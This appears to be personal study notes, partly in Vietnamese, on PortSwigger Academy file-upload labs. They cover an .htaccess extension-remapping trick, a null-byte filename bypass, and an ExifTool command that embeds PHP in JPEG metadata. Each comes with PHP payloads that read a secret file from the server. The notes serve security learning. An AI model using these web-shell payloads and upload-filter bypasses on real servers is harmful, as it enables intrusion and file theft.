# Web shell upload via extension blacklist bypass

https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass

1. Upload `.php` file --> blocked

2. Upload `.htaccess` file with content: `AddType application/x-httpd-php .l33t` to overwrite the config in upload folder

3. Upload `test.133t` with content: `<?php echo file_get_contents('/home/carlos/secret'); ?>` to get the flag.

# Bypass whitelist extension with Null byte

Upload avatar only allowed .png and .jpg

PHP 5.3.4 < Vulnerable to null byte injection

*file name*: `test.php%00.jpg`

# Flawed validation of the file's contents
Instead of implicitly trusting the Content-Type specified in a request, more secure servers try to verify that the contents of the file actually match what is expected.

This is a much more robust way of validating the file type, but even this isn't foolproof. Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.

**ExifTool**: https://exiftool.org/

**Command**:
```bash
.\exiftool.exe -Comment="<?php echo 'START' . file_get_contents('/home/carlos/secret') . 'END'; ?>" 1.jpg -o magic.php
```

`1.jpg` là ảnh chèn metadata. Câu lệnh trên chèn code `PHP` vào metadata của `1.jpg` và khi ảnh này được upload và được đọc như file php(file extension/inclusion) thì đoạn code PHP trên sẽ được thực thi. Phần START và END để phân biệt output của câu lệnh với đống byte 'rác'.

![magic](magic.png)

